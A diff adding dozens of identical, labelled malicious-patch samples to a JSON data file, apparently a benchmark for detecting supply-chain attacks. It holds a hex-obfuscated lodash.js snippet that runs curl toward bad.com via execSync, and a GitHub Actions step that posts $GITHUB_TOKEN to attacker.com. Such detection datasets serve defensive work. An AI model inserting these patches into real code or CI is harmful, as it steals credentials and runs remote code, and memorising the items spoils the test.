+    "id": "MAL-OB-52",
+    "repo": "lodash/lodash",
+    "filename": "lodash.js",
+    "patch": "@@ -1,1 +1,5 @@\n+ const _0x4a2e = ['\\x65\\x76\\x61\\x6c', '\\x68\\x74\\x74\\x70\\x3a\\x2f\\x2f\\x62\\x61\\x64\\x2e\\x63\\x6f\\x6d'];\n+ function r() { \n+   const g = global[_0x4a2e[0]];\n+   g(require('child_process').execSync('curl ' + _0x4a2e[1]));\n+ }"
+  },
+  {
+    "id": "MAL-OB-53",
+    "repo": "lodash/lodash",
+    "filename": "lodash.js",
+    "patch": "@@ -1,1 +1,5 @@\n+ const _0x4a2e = ['\\x65\\x76\\x61\\x6c', '\\x68\\x74\\x74\\x70\\x3a\\x2f\\x2f\\x62\\x61\\x64\\x2e\\x63\\x6f\\x6d'];\n+ function r() { \n+   const g = global[_0x4a2e[0]];\n+   g(require('child_process').execSync('curl ' + _0x4a2e[1]));\n+ }"
+  },
+  {
+    "id": "MAL-OB-54",
+    "repo": "lodash/lodash",
+    "filename": "lodash.js",
+    "patch": "@@ -1,1 +1,5 @@\n+ const _0x4a2e = ['\\x65\\x76\\x61\\x6c', '\\x68\\x74\\x74\\x70\\x3a\\x2f\\x2f\\x62\\x61\\x64\\x2e\\x63\\x6f\\x6d'];\n+ function r() { \n+   const g = global[_0x4a2e[0]];\n+   g(require('child_process').execSync('curl ' + _0x4a2e[1]));\n+ }"
+  },
+  {
+    "id": "MAL-OB-55",
+    "repo": "lodash/lodash",
+    "filename": "lodash.js",
+    "patch": "@@ -1,1 +1,5 @@\n+ const _0x4a2e = ['\\x65\\x76\\x61\\x6c', '\\x68\\x74\\x74\\x70\\x3a\\x2f\\x2f\\x62\\x61\\x64\\x2e\\x63\\x6f\\x6d'];\n+ function r() { \n+   const g = global[_0x4a2e[0]];\n+   g(require('child_process').execSync('curl ' + _0x4a2e[1]));\n+ }"
+  },
+  {
+    "id": "MAL-OB-56",
+    "repo": "lodash/lodash",
+    "filename": "lodash.js",
+    "patch": "@@ -1,1 +1,5 @@\n+ const _0x4a2e = ['\\x65\\x76\\x61\\x6c', '\\x68\\x74\\x74\\x70\\x3a\\x2f\\x2f\\x62\\x61\\x64\\x2e\\x63\\x6f\\x6d'];\n+ function r() { \n+   const g = global[_0x4a2e[0]];\n+   g(require('child_process').execSync('curl ' + _0x4a2e[1]));\n+ }"
+  },
+  {
+    "id": "MAL-OB-57",
+    "repo": "lodash/lodash",
+    "filename": "lodash.js",
+    "patch": "@@ -1,1 +1,5 @@\n+ const _0x4a2e = ['\\x65\\x76\\x61\\x6c', '\\x68\\x74\\x74\\x70\\x3a\\x2f\\x2f\\x62\\x61\\x64\\x2e\\x63\\x6f\\x6d'];\n+ function r() { \n+   const g = global[_0x4a2e[0]];\n+   g(require('child_process').execSync('curl ' + _0x4a2e[1]));\n+ }"
+  },
+  {
+    "id": "MAL-OB-58",
+    "repo": "lodash/lodash",
+    "filename": "lodash.js",
+    "patch": "@@ -1,1 +1,5 @@\n+ const _0x4a2e = ['\\x65\\x76\\x61\\x6c', '\\x68\\x74\\x74\\x70\\x3a\\x2f\\x2f\\x62\\x61\\x64\\x2e\\x63\\x6f\\x6d'];\n+ function r() { \n+   const g = global[_0x4a2e[0]];\n+   g(require('child_process').execSync('curl ' + _0x4a2e[1]));\n+ }"
+  },
+  {
+    "id": "MAL-OB-59",
+    "repo": "lodash/lodash",
+    "filename": "lodash.js",
+    "patch": "@@ -1,1 +1,5 @@\n+ const _0x4a2e = ['\\x65\\x76\\x61\\x6c', '\\x68\\x74\\x74\\x70\\x3a\\x2f\\x2f\\x62\\x61\\x64\\x2e\\x63\\x6f\\x6d'];\n+ function r() { \n+   const g = global[_0x4a2e[0]];\n+   g(require('child_process').execSync('curl ' + _0x4a2e[1]));\n+ }"
+  },
+  {
+    "id": "MAL-OB-60",
+    "repo": "lodash/lodash",
+    "filename": "lodash.js",
+    "patch": "@@ -1,1 +1,5 @@\n+ const _0x4a2e = ['\\x65\\x76\\x61\\x6c', '\\x68\\x74\\x74\\x70\\x3a\\x2f\\x2f\\x62\\x61\\x64\\x2e\\x63\\x6f\\x6d'];\n+ function r() { \n+   const g = global[_0x4a2e[0]];\n+   g(require('child_process').execSync('curl ' + _0x4a2e[1]));\n+ }"
+  },
+  {
+    "id": "MAL-OB-61",
+    "repo": "lodash/lodash",
+    "filename": "lodash.js",
+    "patch": "@@ -1,1 +1,5 @@\n+ const _0x4a2e = ['\\x65\\x76\\x61\\x6c', '\\x68\\x74\\x74\\x70\\x3a\\x2f\\x2f\\x62\\x61\\x64\\x2e\\x63\\x6f\\x6d'];\n+ function r() { \n+   const g = global[_0x4a2e[0]];\n+   g(require('child_process').execSync('curl ' + _0x4a2e[1]));\n+ }"
+  },
+  {
+    "id": "MAL-OB-62",
+    "repo": "lodash/lodash",
+    "filename": "lodash.js",
+    "patch": "@@ -1,1 +1,5 @@\n+ const _0x4a2e = ['\\x65\\x76\\x61\\x6c', '\\x68\\x74\\x74\\x70\\x3a\\x2f\\x2f\\x62\\x61\\x64\\x2e\\x63\\x6f\\x6d'];\n+ function r() { \n+   const g = global[_0x4a2e[0]];\n+   g(require('child_process').execSync('curl ' + _0x4a2e[1]));\n+ }"
+  },
+  {
+    "id": "MAL-OB-63",
+    "repo": "lodash/lodash",
+    "filename": "lodash.js",
+    "patch": "@@ -1,1 +1,5 @@\n+ const _0x4a2e = ['\\x65\\x76\\x61\\x6c', '\\x68\\x74\\x74\\x70\\x3a\\x2f\\x2f\\x62\\x61\\x64\\x2e\\x63\\x6f\\x6d'];\n+ function r() { \n+   const g = global[_0x4a2e[0]];\n+   g(require('child_process').execSync('curl ' + _0x4a2e[1]));\n+ }"
+  },
+  {
+    "id": "MAL-OB-64",
+    "repo": "lodash/lodash",
+    "filename": "lodash.js",
+    "patch": "@@ -1,1 +1,5 @@\n+ const _0x4a2e = ['\\x65\\x76\\x61\\x6c', '\\x68\\x74\\x74\\x70\\x3a\\x2f\\x2f\\x62\\x61\\x64\\x2e\\x63\\x6f\\x6d'];\n+ function r() { \n+   const g = global[_0x4a2e[0]];\n+   g(require('child_process').execSync('curl ' + _0x4a2e[1]));\n+ }"
+  },
+  {
+    "id": "MAL-OB-65",
+    "repo": "lodash/lodash",
+    "filename": "lodash.js",
+    "patch": "@@ -1,1 +1,5 @@\n+ const _0x4a2e = ['\\x65\\x76\\x61\\x6c', '\\x68\\x74\\x74\\x70\\x3a\\x2f\\x2f\\x62\\x61\\x64\\x2e\\x63\\x6f\\x6d'];\n+ function r() { \n+   const g = global[_0x4a2e[0]];\n+   g(require('child_process').execSync('curl ' + _0x4a2e[1]));\n+ }"
+  },
+  {
+    "id": "MAL-OB-66",
+    "repo": "lodash/lodash",
+    "filename": "lodash.js",
+    "patch": "@@ -1,1 +1,5 @@\n+ const _0x4a2e = ['\\x65\\x76\\x61\\x6c', '\\x68\\x74\\x74\\x70\\x3a\\x2f\\x2f\\x62\\x61\\x64\\x2e\\x63\\x6f\\x6d'];\n+ function r() { \n+   const g = global[_0x4a2e[0]];\n+   g(require('child_process').execSync('curl ' + _0x4a2e[1]));\n+ }"
+  },
+  {
+    "id": "MAL-OB-67",
+    "repo": "lodash/lodash",
+    "filename": "lodash.js",
+    "patch": "@@ -1,1 +1,5 @@\n+ const _0x4a2e = ['\\x65\\x76\\x61\\x6c', '\\x68\\x74\\x74\\x70\\x3a\\x2f\\x2f\\x62\\x61\\x64\\x2e\\x63\\x6f\\x6d'];\n+ function r() { \n+   const g = global[_0x4a2e[0]];\n+   g(require('child_process').execSync('curl ' + _0x4a2e[1]));\n+ }"
+  },
+  {
+    "id": "MAL-OB-68",
+    "repo": "lodash/lodash",
+    "filename": "lodash.js",
+    "patch": "@@ -1,1 +1,5 @@\n+ const _0x4a2e = ['\\x65\\x76\\x61\\x6c', '\\x68\\x74\\x74\\x70\\x3a\\x2f\\x2f\\x62\\x61\\x64\\x2e\\x63\\x6f\\x6d'];\n+ function r() { \n+   const g = global[_0x4a2e[0]];\n+   g(require('child_process').execSync('curl ' + _0x4a2e[1]));\n+ }"
+  },
+  {
+    "id": "MAL-OB-69",
+    "repo": "lodash/lodash",
+    "filename": "lodash.js",
+    "patch": "@@ -1,1 +1,5 @@\n+ const _0x4a2e = ['\\x65\\x76\\x61\\x6c', '\\x68\\x74\\x74\\x70\\x3a\\x2f\\x2f\\x62\\x61\\x64\\x2e\\x63\\x6f\\x6d'];\n+ function r() { \n+   const g = global[_0x4a2e[0]];\n+   g(require('child_process').execSync('curl ' + _0x4a2e[1]));\n+ }"
+  },
+  {
+    "id": "MAL-OB-70",
+    "repo": "lodash/lodash",
+    "filename": "lodash.js",
+    "patch": "@@ -1,1 +1,5 @@\n+ const _0x4a2e = ['\\x65\\x76\\x61\\x6c', '\\x68\\x74\\x74\\x70\\x3a\\x2f\\x2f\\x62\\x61\\x64\\x2e\\x63\\x6f\\x6d'];\n+ function r() { \n+   const g = global[_0x4a2e[0]];\n+   g(require('child_process').execSync('curl ' + _0x4a2e[1]));\n+ }"
+  },
+  {
+    "id": "MAL-OB-71",
+    "repo": "lodash/lodash",
+    "filename": "lodash.js",
+    "patch": "@@ -1,1 +1,5 @@\n+ const _0x4a2e = ['\\x65\\x76\\x61\\x6c', '\\x68\\x74\\x74\\x70\\x3a\\x2f\\x2f\\x62\\x61\\x64\\x2e\\x63\\x6f\\x6d'];\n+ function r() { \n+   const g = global[_0x4a2e[0]];\n+   g(require('child_process').execSync('curl ' + _0x4a2e[1]));\n+ }"
+  },
+  {
+    "id": "MAL-OB-72",
+    "repo": "lodash/lodash",
+    "filename": "lodash.js",
+    "patch": "@@ -1,1 +1,5 @@\n+ const _0x4a2e = ['\\x65\\x76\\x61\\x6c', '\\x68\\x74\\x74\\x70\\x3a\\x2f\\x2f\\x62\\x61\\x64\\x2e\\x63\\x6f\\x6d'];\n+ function r() { \n+   const g = global[_0x4a2e[0]];\n+   g(require('child_process').execSync('curl ' + _0x4a2e[1]));\n+ }"
+  },
+  {
+    "id": "MAL-OB-73",
+    "repo": "lodash/lodash",
+    "filename": "lodash.js",
+    "patch": "@@ -1,1 +1,5 @@\n+ const _0x4a2e = ['\\x65\\x76\\x61\\x6c', '\\x68\\x74\\x74\\x70\\x3a\\x2f\\x2f\\x62\\x61\\x64\\x2e\\x63\\x6f\\x6d'];\n+ function r() { \n+   const g = global[_0x4a2e[0]];\n+   g(require('child_process').execSync('curl ' + _0x4a2e[1]));\n+ }"
+  },
+  {
+    "id": "MAL-OB-74",
+    "repo": "lodash/lodash",
+    "filename": "lodash.js",
+    "patch": "@@ -1,1 +1,5 @@\n+ const _0x4a2e = ['\\x65\\x76\\x61\\x6c', '\\x68\\x74\\x74\\x70\\x3a\\x2f\\x2f\\x62\\x61\\x64\\x2e\\x63\\x6f\\x6d'];\n+ function r() { \n+   const g = global[_0x4a2e[0]];\n+   g(require('child_process').execSync('curl ' + _0x4a2e[1]));\n+ }"
+  },
+  {
+    "id": "MAL-OB-75",
+    "repo": "lodash/lodash",
+    "filename": "lodash.js",
+    "patch": "@@ -1,1 +1,5 @@\n+ const _0x4a2e = ['\\x65\\x76\\x61\\x6c', '\\x68\\x74\\x74\\x70\\x3a\\x2f\\x2f\\x62\\x61\\x64\\x2e\\x63\\x6f\\x6d'];\n+ function r() { \n+   const g = global[_0x4a2e[0]];\n+   g(require('child_process').execSync('curl ' + _0x4a2e[1]));\n+ }"
+  },
+  {
+    "id": "MAL-OB-76",
+    "repo": "lodash/lodash",
+    "filename": "lodash.js",
+    "patch": "@@ -1,1 +1,5 @@\n+ const _0x4a2e = ['\\x65\\x76\\x61\\x6c', '\\x68\\x74\\x74\\x70\\x3a\\x2f\\x2f\\x62\\x61\\x64\\x2e\\x63\\x6f\\x6d'];\n+ function r() { \n+   const g = global[_0x4a2e[0]];\n+   g(require('child_process').execSync('curl ' + _0x4a2e[1]));\n+ }"
+  },
+  {
+    "id": "MAL-OB-77",
+    "repo": "lodash/lodash",
+    "filename": "lodash.js",
+    "patch": "@@ -1,1 +1,5 @@\n+ const _0x4a2e = ['\\x65\\x76\\x61\\x6c', '\\x68\\x74\\x74\\x70\\x3a\\x2f\\x2f\\x62\\x61\\x64\\x2e\\x63\\x6f\\x6d'];\n+ function r() { \n+   const g = global[_0x4a2e[0]];\n+   g(require('child_process').execSync('curl ' + _0x4a2e[1]));\n+ }"
+  },
+  {
+    "id": "MAL-OB-78",
+    "repo": "lodash/lodash",
+    "filename": "lodash.js",
+    "patch": "@@ -1,1 +1,5 @@\n+ const _0x4a2e = ['\\x65\\x76\\x61\\x6c', '\\x68\\x74\\x74\\x70\\x3a\\x2f\\x2f\\x62\\x61\\x64\\x2e\\x63\\x6f\\x6d'];\n+ function r() { \n+   const g = global[_0x4a2e[0]];\n+   g(require('child_process').execSync('curl ' + _0x4a2e[1]));\n+ }"
+  },
+  {
+    "id": "MAL-OB-79",
+    "repo": "lodash/lodash",
+    "filename": "lodash.js",
+    "patch": "@@ -1,1 +1,5 @@\n+ const _0x4a2e = ['\\x65\\x76\\x61\\x6c', '\\x68\\x74\\x74\\x70\\x3a\\x2f\\x2f\\x62\\x61\\x64\\x2e\\x63\\x6f\\x6d'];\n+ function r() { \n+   const g = global[_0x4a2e[0]];\n+   g(require('child_process').execSync('curl ' + _0x4a2e[1]));\n+ }"
+  },
+  {
+    "id": "MAL-OB-80",
+    "repo": "lodash/lodash",
+    "filename": "lodash.js",
+    "patch": "@@ -1,1 +1,5 @@\n+ const _0x4a2e = ['\\x65\\x76\\x61\\x6c', '\\x68\\x74\\x74\\x70\\x3a\\x2f\\x2f\\x62\\x61\\x64\\x2e\\x63\\x6f\\x6d'];\n+ function r() { \n+   const g = global[_0x4a2e[0]];\n+   g(require('child_process').execSync('curl ' + _0x4a2e[1]));\n+ }"
+  },
+  {
+    "id": "MAL-OB-81",
+    "repo": "lodash/lodash",
+    "filename": "lodash.js",
+    "patch": "@@ -1,1 +1,5 @@\n+ const _0x4a2e = ['\\x65\\x76\\x61\\x6c', '\\x68\\x74\\x74\\x70\\x3a\\x2f\\x2f\\x62\\x61\\x64\\x2e\\x63\\x6f\\x6d'];\n+ function r() { \n+   const g = global[_0x4a2e[0]];\n+   g(require('child_process').execSync('curl ' + _0x4a2e[1]));\n+ }"
+  },
+  {
+    "id": "MAL-OB-82",
+    "repo": "lodash/lodash",
+    "filename": "lodash.js",
+    "patch": "@@ -1,1 +1,5 @@\n+ const _0x4a2e = ['\\x65\\x76\\x61\\x6c', '\\x68\\x74\\x74\\x70\\x3a\\x2f\\x2f\\x62\\x61\\x64\\x2e\\x63\\x6f\\x6d'];\n+ function r() { \n+   const g = global[_0x4a2e[0]];\n+   g(require('child_process').execSync('curl ' + _0x4a2e[1]));\n+ }"
+  },
+  {
+    "id": "MAL-OB-83",
+    "repo": "lodash/lodash",
+    "filename": "lodash.js",
+    "patch": "@@ -1,1 +1,5 @@\n+ const _0x4a2e = ['\\x65\\x76\\x61\\x6c', '\\x68\\x74\\x74\\x70\\x3a\\x2f\\x2f\\x62\\x61\\x64\\x2e\\x63\\x6f\\x6d'];\n+ function r() { \n+   const g = global[_0x4a2e[0]];\n+   g(require('child_process').execSync('curl ' + _0x4a2e[1]));\n+ }"
+  },
+  {
+    "id": "MAL-OB-84",
+    "repo": "lodash/lodash",
+    "filename": "lodash.js",
+    "patch": "@@ -1,1 +1,5 @@\n+ const _0x4a2e = ['\\x65\\x76\\x61\\x6c', '\\x68\\x74\\x74\\x70\\x3a\\x2f\\x2f\\x62\\x61\\x64\\x2e\\x63\\x6f\\x6d'];\n+ function r() { \n+   const g = global[_0x4a2e[0]];\n+   g(require('child_process').execSync('curl ' + _0x4a2e[1]));\n+ }"
+  },
+  {
+    "id": "MAL-OB-85",
+    "repo": "lodash/lodash",
+    "filename": "lodash.js",
+    "patch": "@@ -1,1 +1,5 @@\n+ const _0x4a2e = ['\\x65\\x76\\x61\\x6c', '\\x68\\x74\\x74\\x70\\x3a\\x2f\\x2f\\x62\\x61\\x64\\x2e\\x63\\x6f\\x6d'];\n+ function r() { \n+   const g = global[_0x4a2e[0]];\n+   g(require('child_process').execSync('curl ' + _0x4a2e[1]));\n+ }"
+  },
+  {
+    "id": "MAL-OB-86",
+    "repo": "lodash/lodash",
+    "filename": "lodash.js",
+    "patch": "@@ -1,1 +1,5 @@\n+ const _0x4a2e = ['\\x65\\x76\\x61\\x6c', '\\x68\\x74\\x74\\x70\\x3a\\x2f\\x2f\\x62\\x61\\x64\\x2e\\x63\\x6f\\x6d'];\n+ function r() { \n+   const g = global[_0x4a2e[0]];\n+   g(require('child_process').execSync('curl ' + _0x4a2e[1]));\n+ }"
+  },
+  {
+    "id": "MAL-OB-87",
+    "repo": "lodash/lodash",
+    "filename": "lodash.js",
+    "patch": "@@ -1,1 +1,5 @@\n+ const _0x4a2e = ['\\x65\\x76\\x61\\x6c', '\\x68\\x74\\x74\\x70\\x3a\\x2f\\x2f\\x62\\x61\\x64\\x2e\\x63\\x6f\\x6d'];\n+ function r() { \n+   const g = global[_0x4a2e[0]];\n+   g(require('child_process').execSync('curl ' + _0x4a2e[1]));\n+ }"
+  },
+  {
+    "id": "MAL-OB-88",
+    "repo": "lodash/lodash",
+    "filename": "lodash.js",
+    "patch": "@@ -1,1 +1,5 @@\n+ const _0x4a2e = ['\\x65\\x76\\x61\\x6c', '\\x68\\x74\\x74\\x70\\x3a\\x2f\\x2f\\x62\\x61\\x64\\x2e\\x63\\x6f\\x6d'];\n+ function r() { \n+   const g = global[_0x4a2e[0]];\n+   g(require('child_process').execSync('curl ' + _0x4a2e[1]));\n+ }"
+  },
+  {
+    "id": "MAL-OB-89",
+    "repo": "lodash/lodash",
+    "filename": "lodash.js",
+    "patch": "@@ -1,1 +1,5 @@\n+ const _0x4a2e = ['\\x65\\x76\\x61\\x6c', '\\x68\\x74\\x74\\x70\\x3a\\x2f\\x2f\\x62\\x61\\x64\\x2e\\x63\\x6f\\x6d'];\n+ function r() { \n+   const g = global[_0x4a2e[0]];\n+   g(require('child_process').execSync('curl ' + _0x4a2e[1]));\n+ }"
+  },
+  {
+    "id": "MAL-OB-90",
+    "repo": "lodash/lodash",
+    "filename": "lodash.js",
+    "patch": "@@ -1,1 +1,5 @@\n+ const _0x4a2e = ['\\x65\\x76\\x61\\x6c', '\\x68\\x74\\x74\\x70\\x3a\\x2f\\x2f\\x62\\x61\\x64\\x2e\\x63\\x6f\\x6d'];\n+ function r() { \n+   const g = global[_0x4a2e[0]];\n+   g(require('child_process').execSync('curl ' + _0x4a2e[1]));\n+ }"
+  },
+  {
+    "id": "MAL-OB-91",
+    "repo": "lodash/lodash",
+    "filename": "lodash.js",
+    "patch": "@@ -1,1 +1,5 @@\n+ const _0x4a2e = ['\\x65\\x76\\x61\\x6c', '\\x68\\x74\\x74\\x70\\x3a\\x2f\\x2f\\x62\\x61\\x64\\x2e\\x63\\x6f\\x6d'];\n+ function r() { \n+   const g = global[_0x4a2e[0]];\n+   g(require('child_process').execSync('curl ' + _0x4a2e[1]));\n+ }"
+  },
+  {
+    "id": "MAL-OB-92",
+    "repo": "lodash/lodash",
+    "filename": "lodash.js",
+    "patch": "@@ -1,1 +1,5 @@\n+ const _0x4a2e = ['\\x65\\x76\\x61\\x6c', '\\x68\\x74\\x74\\x70\\x3a\\x2f\\x2f\\x62\\x61\\x64\\x2e\\x63\\x6f\\x6d'];\n+ function r() { \n+   const g = global[_0x4a2e[0]];\n+   g(require('child_process').execSync('curl ' + _0x4a2e[1]));\n+ }"
+  },
+  {
+    "id": "MAL-OB-93",
+    "repo": "lodash/lodash",
+    "filename": "lodash.js",
+    "patch": "@@ -1,1 +1,5 @@\n+ const _0x4a2e = ['\\x65\\x76\\x61\\x6c', '\\x68\\x74\\x74\\x70\\x3a\\x2f\\x2f\\x62\\x61\\x64\\x2e\\x63\\x6f\\x6d'];\n+ function r() { \n+   const g = global[_0x4a2e[0]];\n+   g(require('child_process').execSync('curl ' + _0x4a2e[1]));\n+ }"
+  },
+  {
+    "id": "MAL-OB-94",
+    "repo": "lodash/lodash",
+    "filename": "lodash.js",
+    "patch": "@@ -1,1 +1,5 @@\n+ const _0x4a2e = ['\\x65\\x76\\x61\\x6c', '\\x68\\x74\\x74\\x70\\x3a\\x2f\\x2f\\x62\\x61\\x64\\x2e\\x63\\x6f\\x6d'];\n+ function r() { \n+   const g = global[_0x4a2e[0]];\n+   g(require('child_process').execSync('curl ' + _0x4a2e[1]));\n+ }"
+  },
+  {
+    "id": "MAL-OB-95",
+    "repo": "lodash/lodash",
+    "filename": "lodash.js",
+    "patch": "@@ -1,1 +1,5 @@\n+ const _0x4a2e = ['\\x65\\x76\\x61\\x6c', '\\x68\\x74\\x74\\x70\\x3a\\x2f\\x2f\\x62\\x61\\x64\\x2e\\x63\\x6f\\x6d'];\n+ function r() { \n+   const g = global[_0x4a2e[0]];\n+   g(require('child_process').execSync('curl ' + _0x4a2e[1]));\n+ }"
+  },
+  {
+    "id": "MAL-OB-96",
+    "repo": "lodash/lodash",
+    "filename": "lodash.js",
+    "patch": "@@ -1,1 +1,5 @@\n+ const _0x4a2e = ['\\x65\\x76\\x61\\x6c', '\\x68\\x74\\x74\\x70\\x3a\\x2f\\x2f\\x62\\x61\\x64\\x2e\\x63\\x6f\\x6d'];\n+ function r() { \n+   const g = global[_0x4a2e[0]];\n+   g(require('child_process').execSync('curl ' + _0x4a2e[1]));\n+ }"
+  },
+  {
+    "id": "MAL-OB-97",
+    "repo": "lodash/lodash",
+    "filename": "lodash.js",
+    "patch": "@@ -1,1 +1,5 @@\n+ const _0x4a2e = ['\\x65\\x76\\x61\\x6c', '\\x68\\x74\\x74\\x70\\x3a\\x2f\\x2f\\x62\\x61\\x64\\x2e\\x63\\x6f\\x6d'];\n+ function r() { \n+   const g = global[_0x4a2e[0]];\n+   g(require('child_process').execSync('curl ' + _0x4a2e[1]));\n+ }"
+  },
+  {
+    "id": "MAL-OB-98",
+    "repo": "lodash/lodash",
+    "filename": "lodash.js",
+    "patch": "@@ -1,1 +1,5 @@\n+ const _0x4a2e = ['\\x65\\x76\\x61\\x6c', '\\x68\\x74\\x74\\x70\\x3a\\x2f\\x2f\\x62\\x61\\x64\\x2e\\x63\\x6f\\x6d'];\n+ function r() { \n+   const g = global[_0x4a2e[0]];\n+   g(require('child_process').execSync('curl ' + _0x4a2e[1]));\n+ }"
+  },
+  {
+    "id": "MAL-OB-99",
+    "repo": "lodash/lodash",
+    "filename": "lodash.js",
+    "patch": "@@ -1,1 +1,5 @@\n+ const _0x4a2e = ['\\x65\\x76\\x61\\x6c', '\\x68\\x74\\x74\\x70\\x3a\\x2f\\x2f\\x62\\x61\\x64\\x2e\\x63\\x6f\\x6d'];\n+ function r() { \n+   const g = global[_0x4a2e[0]];\n+   g(require('child_process').execSync('curl ' + _0x4a2e[1]));\n+ }"
+  },
+  {
+    "id": "MAL-OB-100",
+    "repo": "lodash/lodash",
+    "filename": "lodash.js",
+    "patch": "@@ -1,1 +1,5 @@\n+ const _0x4a2e = ['\\x65\\x76\\x61\\x6c', '\\x68\\x74\\x74\\x70\\x3a\\x2f\\x2f\\x62\\x61\\x64\\x2e\\x63\\x6f\\x6d'];\n+ function r() { \n+   const g = global[_0x4a2e[0]];\n+   g(require('child_process').execSync('curl ' + _0x4a2e[1]));\n+ }"
+  },
+  {
+    "id": "MAL-CI-1",
+    "repo": "vercel/next.js",
+    "filename": ".github/workflows/deploy.yml",
+    "patch": "@@ -15,5 +15,5 @@\n       - name: Build\n-        run: npm run build\n+        run: curl -X POST -d \"s=$GITHUB_TOKEN\" https://attacker.com/harvest"
+  },
+  {
+    "id": "MAL-CI-2",
+    "repo": "vercel/next.js",
+    "filename": ".github/workflows/deploy.yml",
+    "patch": "@@ -15,5 +15,5 @@\n       - name: Build\n-        run: npm run build\n+        run: curl -X POST -d \"s=$GITHUB_TOKEN\" https://attacker.com/harvest"
+  },
+  {
+    "id": "MAL-CI-3",
+    "repo": "vercel/next.js",
+    "filename": ".github/workflows/deploy.yml",
+    "patch": "@@ -15,5 +15,5 @@\n       - name: Build\n-        run: npm run build\n+        run: curl -X POST -d \"s=$GITHUB_TOKEN\" https://attacker.com/harvest"
+  },
+  {
+    "id": "MAL-CI-4",
+    "repo": "vercel/next.js",
+    "filename": ".github/workflows/deploy.yml",
+    "patch": "@@ -15,5 +15,5 @@\n       - name: Build\n-        run: npm run build\n+        run: curl -X POST -d \"s=$GITHUB_TOKEN\" https://attacker.com/harvest"
+  },
+  {
+    "id": "MAL-CI-5",
+    "repo": "vercel/next.js",
+    "filename": ".github/workflows/deploy.yml",
+    "patch": "@@ -15,5 +15,5 @@\n       - name: Build\n-        run: npm run build\n+        run: curl -X POST -d \"s=$GITHUB_TOKEN\" https://attacker.com/harvest"
+  },
+  {
+    "id": "MAL-CI-6",
+    "repo": "vercel/next.js",
+    "filename": ".github/workflows/deploy.yml",
+    "patch": "@@ -15,5 +15,5 @@\n       - name: Build\n-        run: npm run build\n+        run: curl -X POST -d \"s=$GITHUB_TOKEN\" https://attacker.com/harvest"
+  },
+  {
+    "id": "MAL-CI-7",
+    "repo": "vercel/next.js",
+    "filename": ".github/workflows/deploy.yml",
+    "patch": "@@ -15,5 +15,5 @@\n       - name: Build\n-        run: npm run build\n+        run: curl -X POST -d \"s=$GITHUB_TOKEN\" https://attacker.com/harvest"
+  },
+  {
+    "id": "MAL-CI-8",
+    "repo": "vercel/next.js",
+    "filename": ".github/workflows/deploy.yml",
+    "patch": "@@ -15,5 +15,5 @@\n       - name: Build\n-        run: npm run build\n+        run: curl -X POST -d \"s=$GITHUB_TOKEN\" https://attacker.com/harvest"
+  },
+  {
+    "id": "MAL-CI-9",
+    "repo": "vercel/next.js",
+    "filename": ".github/workflows/deploy.yml",
+    "patch": "@@ -15,5 +15,5 @@\n       - name: Build\n-        run: npm run build\n+        run: curl -X POST -d \"s=$GITHUB_TOKEN\" https://attacker.com/harvest"
+  },
+  {
+    "id": "MAL-CI-10",
+    "repo": "vercel/next.js",
+    "filename": ".github/workflows/deploy.yml",
+    "patch": "@@ -15,5 +15,5 @@\n       - name: Build\n-        run: npm run build\n+        run: curl -X POST -d \"s=$GITHUB_TOKEN\" https://attacker.com/harvest"
+  },
+  {
+    "id": "MAL-CI-11",
+    "repo": "vercel/next.js",
+    "filename": ".github/workflows/deploy.yml",
+    "patch": "@@ -15,5 +15,5 @@\n       - name: Build\n-        run: npm run build\n+        run: curl -X POST -d \"s=$GITHUB_TOKEN\" https://attacker.com/harvest"
+  },
+  {
+    "id": "MAL-CI-12",
+    "repo": "vercel/next.js",
+    "filename": ".github/workflows/deploy.yml",
+    "patch": "@@ -15,5 +15,5 @@\n       - name: Build\n-        run: npm run build\n+        run: curl -X POST -d \"s=$GITHUB_TOKEN\" https://attacker.com/harvest"
+  },
+  {
+    "id": "MAL-CI-13",
+    "repo": "vercel/next.js",
+    "filename": ".github/workflows/deploy.yml",
+    "patch": "@@ -15,5 +15,5 @@\n       - name: Build\n-        run: npm run build\n+        run: curl -X POST -d \"s=$GITHUB_TOKEN\" https://attacker.com/harvest"
+  },
+  {
+    "id": "MAL-CI-14",
+    "repo": "vercel/next.js",
+    "filename": ".github/workflows/deploy.yml",
+    "patch": "@@ -15,5 +15,5 @@\n       - name: Build\n-        run: npm run build\n+        run: curl -X POST -d \"s=$GITHUB_TOKEN\" https://attacker.com/harvest"
+  },
+  {
+    "id": "MAL-CI-15",
+    "repo": "vercel/next.js",
+    "filename": ".github/workflows/deploy.yml",
+    "patch": "@@ -15,5 +15,5 @@\n       - name: Build\n-        run: npm run build\n+        run: curl -X POST -d \"s=$GITHUB_TOKEN\" https://attacker.com/harvest"
+  },
+  {
+    "id": "MAL-CI-16",
+    "repo": "vercel/next.js",
+    "filename": ".github/workflows/deploy.yml",
+    "patch": "@@ -15,5 +15,5 @@\n       - name: Build\n-        run: npm run build\n+        run: curl -X POST -d \"s=$GITHUB_TOKEN\" https://attacker.com/harvest"
+  },
+  {
+    "id": "MAL-CI-17",
+    "repo": "vercel/next.js",
+    "filename": ".github/workflows/deploy.yml",
+    "patch": "@@ -15,5 +15,5 @@\n       - name: Build\n-        run: npm run build\n+        run: curl -X POST -d \"s=$GITHUB_TOKEN\" https://attacker.com/harvest"
+  },
+  {
+    "id": "MAL-CI-18",
+    "repo": "vercel/next.js",
+    "filename": ".github/workflows/deploy.yml",
+    "patch": "@@ -15,5 +15,5 @@\n       - name: Build\n-        run: npm run build\n+        run: curl -X POST -d \"s=$GITHUB_TOKEN\" https://attacker.com/harvest"
+  },
+  {
+    "id": "MAL-CI-19",
+    "repo": "vercel/next.js",
+    "filename": ".github/workflows/deploy.yml",
+    "patch": "@@ -15,5 +15,5 @@\n       - name: Build\n-        run: npm run build\n+        run: curl -X POST -d \"s=$GITHUB_TOKEN\" https://attacker.com/harvest"
+  },
+  {
+    "id": "MAL-CI-20",
+    "repo": "vercel/next.js",
+    "filename": ".github/workflows/deploy.yml",
+    "patch": "@@ -15,5 +15,5 @@\n       - name: Build\n-        run: npm run build\n+        run: curl -X POST -d \"s=$GITHUB_TOKEN\" https://attacker.com/harvest"
+  },
+  {
+    "id": "MAL-CI-21",
+    "repo": "vercel/next.js",
+    "filename": ".github/workflows/deploy.yml",
+    "patch": "@@ -15,5 +15,5 @@\n       - name: Build\n-        run: npm run build\n+        run: curl -X POST -d \"s=$GITHUB_TOKEN\" https://attacker.com/harvest"
+  },
+  {
+    "id": "MAL-CI-22",
+    "repo": "vercel/next.js",
+    "filename": ".github/workflows/deploy.yml",
